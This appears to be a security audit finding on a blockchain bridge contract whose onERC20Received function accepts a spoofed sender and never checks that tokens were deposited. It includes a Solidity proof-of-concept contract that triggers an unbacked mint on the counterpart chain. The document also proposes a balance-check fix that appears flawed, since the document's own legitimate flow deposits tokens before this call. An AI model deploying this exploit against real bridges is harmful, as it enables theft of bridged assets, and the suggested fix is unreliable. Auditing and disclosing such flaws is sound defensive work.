### Title
Unverified `_from` Parameter in `BridgeTransferERC20.onERC20Received` Allows Registered Token to Spoof Cross-Chain Sender Identity and Trigger Unauthorized Counterpart-Chain Token Release — (`File: contracts/service_chain/bridge/BridgeTransferERC20.sol`)

---

### Summary

`BridgeTransferERC20.onERC20Received` is a `public` function that accepts a caller-supplied `_from` address without verifying it matches `msg.sender`. The function passes `msg.sender` as the token address and the unverified `_from` as the originating user directly into `_requestERC20Transfer`, which emits a `RequestValueTransfer` event. That event crosses the chain boundary and is consumed by bridge operators to call `handleERC20Transfer` on the counterpart chain, where tokens are minted or released. A registered token contract can call `onERC20Received` with an arbitrary `_from` and without depositing any tokens, causing the counterpart bridge to release or mint tokens to an attacker-controlled `_to` address with no corresponding deposit on the source chain.

---

### Finding Description

The 1-step ERC20 bridge deposit flow is:

1. User calls `ERC20ServiceChain.requestValueTransfer`, which first transfers tokens to the bridge, then calls `bridge.onERC20Received(msg.sender, _to, amount, feeLimit, extraData)`.
2. The bridge's `onERC20Received` calls `_requestERC20Transfer(msg.sender, _from, _to, ...)`.
3. `_requestERC20Transfer` checks `onlyRegisteredToken(msg.sender)` (i.e., the token contract is whitelisted), then emits `RequestValueTransfer` with `from = _from`.

The critical code path:

```solidity
// BridgeTransferERC20.sol line 111-121
function onERC20Received(
    address _from,   // ← caller-supplied, never verified
    address _to,
    uint256 _value,
    uint256 _feeLimit,
    bytes memory _extraData
)
    public             // ← no access control
{
    _requestERC20Transfer(msg.sender, _from, _to, _value, _feeLimit, _extraData);
}
```

Inside `_requestERC20Transfer`:

```solidity
// BridgeTransferERC20.sol line 76-108
function _requestERC20Transfer(
    address _tokenAddress,   // = msg.sender (the calling token contract)
    address _from,           // = attacker-supplied arbitrary address
    ...
)
    internal
    onlyRegisteredToken(_tokenAddress)   // only checks msg.sender is whitelisted
    onlyUnlockedToken(_tokenAddress)
{
    require(isRunning, "stopped bridge");
    require(_value > 0, "zero ERC20 token amount");

    uint256 fee = _payERC20FeeAndRefundChange(_from, _tokenAddress, _feeLimit);

    if (modeMintBurn) {
        ERC20Burnable(_tokenAddress).burn(_value);  // burns from bridge balance
    }

    emit RequestValueTransfer(
        TokenType.ERC20,
        _from,   // ← spoofed address emitted as the cross-chain sender
        _to,
        _tokenAddress,
        _value,
        requestNonce,
        fee,
        _extraData
    );
    requestNonce++;
}
```

Two invariants are broken simultaneously:

**Invariant 1 — Token deposit not verified**: `onERC20Received` does not check that the calling token contract actually transferred `_value + _feeLimit` tokens to the bridge before emitting the event. In the legitimate flow (`ERC20ServiceChain.requestValueTransfer`), the transfer happens before the call. A malicious registered token can skip the transfer entirely.

**Invariant 2 — Sender identity not verified**: `_from` is accepted verbatim from the caller. The bridge has no way to confirm that `_from` is the actual user who deposited tokens. This `_from` value crosses the chain boundary and is passed to `handleERC20Transfer` on the counterpart chain, where it is emitted in `HandleValueTransfer` and trusted by any application consuming that event.

---

### Impact Explanation

**Unauthorized token release/mint on the counterpart chain (direct asset impact):**

In a source-chain non-mintBurn / counterpart-chain mintBurn configuration (the common service-chain setup):

- A malicious registered token calls `bridge.onERC20Received(victim_addr, attacker_to, 1000e18, 0, "")` without depositing any tokens.
- `_requestERC20Transfer` passes `onlyRegisteredToken` (attacker's contract is registered), skips the burn (non-mintBurn), and emits `RequestValueTransfer(ERC20, victim_addr, attacker_to, attacker_token, 1000e18, nonce, 0, "")`.
- The bridge operator observes the event and calls `handleERC20Transfer(txHash, victim_addr, attacker_to, counterpart_token, 1000e18, nonce, blockNum, "")` on the counterpart chain.
- The counterpart bridge executes `ERC20Mintable(counterpart_token).mint(attacker_to, 1000e18)`, minting 1000e18 tokens to the attacker with zero deposit on the source chain.

This is an unauthorized mint of bridged assets with no corresponding locked collateral — a direct violation of the bridge's accounting invariant.

**Cross-chain identity confusion (secondary impact):**

The spoofed `_from` is emitted in `HandleValueTransfer` on the counterpart chain. Any application or contract that uses `HandleValueTransfer._from` for access control (e.g., to authorize withdrawals, governance votes, or reward claims) will attribute the action to the wrong address — the direct analog of the ZkSync `msg.sender` preservation bug described in the external report.

**Fee refund redirection:**

`_payERC20FeeAndRefundChange(_from, ...)` sends excess `_feeLimit` tokens to `_from`. If `_from` is spoofed to an attacker-controlled address, fee refunds are redirected.

---

### Likelihood Explanation

The trigger requires the attacker to control or compromise a registered token contract. Token registration is `onlyOwner` (`BridgeTokens.registerToken`), so the attacker must either:

1. Be the bridge owner (fully privileged — out of scope), or
2. Control a registered token contract (e.g., a token whose owner key is compromised, or a token with a delegatecall/arbitrary-call vulnerability).

This is a semi-trusted trigger. The attack surface is real in production service-chain deployments where multiple ERC20 tokens are registered and their contracts may have varying security postures. The likelihood is **Low-Medium**: not trivially exploitable by an anonymous user, but reachable by a compromised or malicious registered token operator.

---

### Recommendation

1. **Verify token deposit before emitting the event**: In `onERC20Received`, record the bridge's token balance before and after the call, and require that the balance increased by at least `_value + _feeLimit`:

```solidity
function onERC20Received(
    address _from,
    address _to,
    uint256 _value,
    uint256 _feeLimit,
    bytes memory _extraData
) public {
    uint256 balanceBefore = IERC20(msg.sender).balanceOf(address(this));
    _requestERC20Transfer(msg.sender, _from, _to, _value, _feeLimit, _extraData);
    uint256 balanceAfter = IERC20(msg.sender).balanceOf(address(this));
    require(balanceAfter >= balanceBefore + _value + _feeLimit, "tokens not deposited");
}
```

2. **Restrict `onERC20Received` to registered tokens at the function level**: Add `onlyRegisteredToken(msg.sender)` directly to `onERC20Received` rather than relying on the internal function, making the access control explicit and auditable.

3. **Document the trust assumption**: Add a comment explicitly stating that `_from` is trusted from the calling token contract and that registered token contracts must be audited to ensure they pass the correct sender.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.5.6;

import "./BridgeTransferERC20.sol";
import "../../libs/openzeppelin-contracts-v2/contracts/token/ERC20/ERC20Mintable.sol";
import "../../libs/openzeppelin-contracts-v2/contracts/token/ERC20/ERC20Burnable.sol";

// Attacker controls this registered token contract
contract MaliciousToken is ERC20Mintable, ERC20Burnable {
    BridgeTransferERC20 public bridge;

    constructor(address _bridge) public {
        bridge = BridgeTransferERC20(_bridge);
    }

    // Attacker calls this to emit a fraudulent RequestValueTransfer event
    // without depositing any tokens
    function exploit(address victim, address attackerTo, uint256 amount) external {
        // No transfer to bridge — tokens are NOT deposited
        // onERC20Received passes onlyRegisteredToken(address(this)) because
        // the bridge owner registered this contract as a token
        bridge.onERC20Received(
            victim,      // spoofed _from: victim's address appears as sender
            attackerTo,  // _to: attacker receives on counterpart chain
            amount,      // _value: amount to mint on counterpart chain
            0,           // _feeLimit: no fee
            ""           // _extraData
        );
        // Result: RequestValueTransfer(ERC20, victim, attackerTo, address(this), amount, nonce, 0, "")
        // is emitted. Bridge operator calls handleERC20Transfer on counterpart chain,
        // minting `amount` tokens to `attackerTo` with zero collateral deposited.
    }
}
```

**Steps**:
1. Bridge owner registers `MaliciousToken` via `bridge.registerToken(maliciousToken, counterpartToken)`.
2. Attacker calls `MaliciousToken.exploit(victim, attackerTo, 1000e18)`.
3. `bridge.onERC20Received(victim, attackerTo, 1000e18, 0, "")` is called; `onlyRegisteredToken(address(maliciousToken))` passes; no tokens are deposited; `RequestValueTransfer` is emitted with `from = victim`.
4. Bridge operator calls `counterpartBridge.handleERC20Transfer(txHash, victim, attackerTo, counterpartToken, 1000e18, nonce, blockNum, "")`.
5. Counterpart bridge mints 1000e18 tokens to `attackerTo` — unauthorized mint with no locked collateral.

**Corrupted value**: `counterpartToken.balanceOf(attackerTo)` increases by `1000e18` with no corresponding deposit in the source bridge, breaking the bridge's 1:1 collateral invariant. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L32-73)
```text
    function handleERC20Transfer(
        bytes32 _requestTxHash,
        address _from,
        address _to,
        address _tokenAddress,
        uint256 _value,
        uint64 _requestedNonce,
        uint64 _requestedBlockNumber,
        bytes memory _extraData
    )
        public
        onlyOperators
    {
        _lowerHandleNonceCheck(_requestedNonce);

        if (!_voteValueTransfer(_requestedNonce)) {
            return;
        }

        _setHandledRequestTxHash(_requestTxHash);

        handleNoncesToBlockNums[_requestedNonce] = _requestedBlockNumber;
        _updateHandleNonce(_requestedNonce);

        emit HandleValueTransfer(
            _requestTxHash,
            TokenType.ERC20,
            _from,
            _to,
            _tokenAddress,
            _value,
            _requestedNonce,
            lowerHandleNonce,
            _extraData
        );

        if (modeMintBurn) {
            require(ERC20Mintable(_tokenAddress).mint(_to, _value), "handleERC20Transfer: mint failed");
        } else {
            IERC20(_tokenAddress).safeTransfer(_to, _value);
        }
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L76-108)
```text
    function _requestERC20Transfer(
        address _tokenAddress,
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        internal
        onlyRegisteredToken(_tokenAddress)
        onlyUnlockedToken(_tokenAddress)
    {
        require(isRunning, "stopped bridge");
        require(_value > 0, "zero ERC20 token amount");

        uint256 fee = _payERC20FeeAndRefundChange(_from, _tokenAddress, _feeLimit);

        if (modeMintBurn) {
            ERC20Burnable(_tokenAddress).burn(_value);
        }

        emit RequestValueTransfer(
            TokenType.ERC20,
            _from,
            _to,
            _tokenAddress,
            _value,
            requestNonce,
            fee,
            _extraData
        );
        requestNonce++;
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L111-121)
```text
    function onERC20Received(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        public
    {
        _requestERC20Transfer(msg.sender, _from, _to, _value, _feeLimit, _extraData);
    }
```

**File:** contracts/service_chain/bridge/BridgeTokens.sol (L32-35)
```text
    modifier onlyRegisteredToken(address _token) {
        require(registeredTokens[_token] != address(0), "not allowed token");
        _;
    }
```

**File:** contracts/testing/sc_erc20/ERC20ServiceChain.sol (L44-47)
```text
    function requestValueTransfer(uint256 _amount, address _to, uint256 _feeLimit, bytes calldata _extraData) external {
        require(transfer(bridge, _amount.add(_feeLimit)), "requestValueTransfer: transfer failed");
        IERC20BridgeReceiver(bridge).onERC20Received(msg.sender, _to, _amount, _feeLimit, _extraData);
    }
```

**File:** contracts/service_chain/IERC20BridgeReceiver.sol (L19-21)
```text
contract IERC20BridgeReceiver {
    function onERC20Received(address _from, address _to, uint256 _amount, uint256 _feeLimit, bytes memory _extraData) public;
}
```

**File:** contracts/service_chain/bridge/BridgeFee.sol (L68-88)
```text
    function _payERC20FeeAndRefundChange(address from, address _token, uint256 _feeLimit) internal returns(uint256) {
        uint256 fee = feeOfERC20[_token];

        if (feeReceiver != address(0) && fee > 0) {
            require(_feeLimit >= fee, "insufficient feeLimit");

            IERC20(_token).safeTransfer(feeReceiver, fee);

            uint256 feeRefund = _feeLimit.sub(fee);
            if (feeRefund > 0) {
                IERC20(_token).safeTransfer(from, feeRefund);
            }

            return fee;
        }

        if (_feeLimit > 0) {
            IERC20(_token).safeTransfer(from, _feeLimit);
        }
        return 0;
    }
```
